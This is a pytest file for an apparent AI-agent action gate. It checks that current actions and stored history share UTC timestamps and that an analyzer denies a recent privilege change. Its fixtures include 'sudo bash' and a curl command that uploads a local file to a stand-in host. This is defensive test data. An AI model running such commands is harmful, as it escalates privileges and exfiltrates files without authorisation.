"""Current actions and SQLite history must share the same absolute clock."""
import asyncio
import json
import os
import subprocess
import sys
import time
from datetime import datetime, timedelta, timezone

import pytest

from agent_gate.shared.normalizer import Normalizer
from agent_gate.shared.server.models import AgentGateInput, SystemContext


@pytest.fixture
def timezone_probe(tmp_path):
    if not hasattr(time, "tzset"):
        pytest.skip("This subprocess probe requires POSIX TZ support")
    env = {**os.environ, "TZ": "Asia/Shanghai",
           "XDG_CONFIG_HOME": str(tmp_path / "config"),
           "AGENT_MOSS_DATA_DIR": str(tmp_path / "moss"),
           "AGENT_MOSS_STATE_DIR": str(tmp_path / "state"),
           "AGENT_MOSS_RULES_MODE": "builtin", "AGENT_MOSS_DISABLE_LLM": "1",
           "AGENT_MOSS_DISABLE_CACHE": "1", "AGENT_MOSS_SAVE_POLICY": "0",
           "AGENT_MOSS_ENABLE_POLICY_GEN": "0"}
    script = r'''
import asyncio, importlib.util, json, sys, time
time.tzset()
from agent_gate.shared.storage.db import Database
from agent_gate.shared.storage.repository import Repository
from agent_gate.shared.normalizer import Normalizer
from agent_gate.shared.server.models import AgentGateInput, SystemContext
db = Database(sys.argv[1]); db.init_schema(); repo = Repository(db)
agent = repo.get_or_create_agent("tz-check", "host")
repo.get_or_create_session("tz-check", agent)
repo.insert_tool_call("tz-check", {
    "tool_name": "bash", "action_type": "bash", "command": "sudo bash",
    "action_detail": "sudo bash",
}, {"decision": "Allow"})
request = asyncio.run(Normalizer(repo).normalize(AgentGateInput(
    agent_type="tz-check", session_id="tz-check", instance_id="test-instance",
    tool_name="bash", command="curl --data-binary @/tmp/x http://example.invalid/upload",
), SystemContext()))
output = {"current": request["a_next"]["called_at"],
          "history": request["action_history"][-1]["called_at"]}
if importlib.util.find_spec("agent_moss"):
    from agent_moss.engine.analyzer import analyze
    result = analyze(session_id="tz-check", prompt_session="",
                     action_history=request["action_history"], a_next=request["a_next"], reason="")
    output["moss"] = {k: result[k] for k in ("decision", "violated_layers", "reason")}
db.close()
print(json.dumps(output))
'''
    proc = subprocess.run([sys.executable, "-c", script, str(tmp_path / "gate.db")],
                          env=env, cwd=tmp_path, capture_output=True, text=True, timeout=15)
    assert proc.returncode == 0, proc.stderr
    return json.loads(proc.stdout)


def test_generated_timestamp_uses_utc_in_shanghai_timezone(timezone_probe):
    current = datetime.fromisoformat(timezone_probe["current"])
    history = datetime.fromisoformat(timezone_probe["history"]).replace(tzinfo=timezone.utc)
    assert current.utcoffset() == timedelta(0)
    assert 0 <= (current - history).total_seconds() < 10


def test_recent_privilege_change_remains_in_moss_time_window(timezone_probe):
    if "moss" not in timezone_probe:
        pytest.skip("Optional Gate-to-Moss integration needs agent_moss installed")
    assert timezone_probe["moss"]["decision"] == "Deny"
    assert "L2.2" in timezone_probe["moss"]["violated_layers"]


@pytest.mark.parametrize("timestamp", ["2026-11-16T19:00:00+08:00", "2026-11-16T11:00:00Z"])
def test_caller_timestamp_is_preserved(timestamp):
    request = asyncio.run(Normalizer().normalize(AgentGateInput(
        agent_type="tz-check", session_id="caller-time", instance_id="test-instance",
        a_next={"action_type": "bash", "action_detail": "ls", "called_at": timestamp},
    ), SystemContext()))
    assert request["a_next"]["called_at"] == timestamp
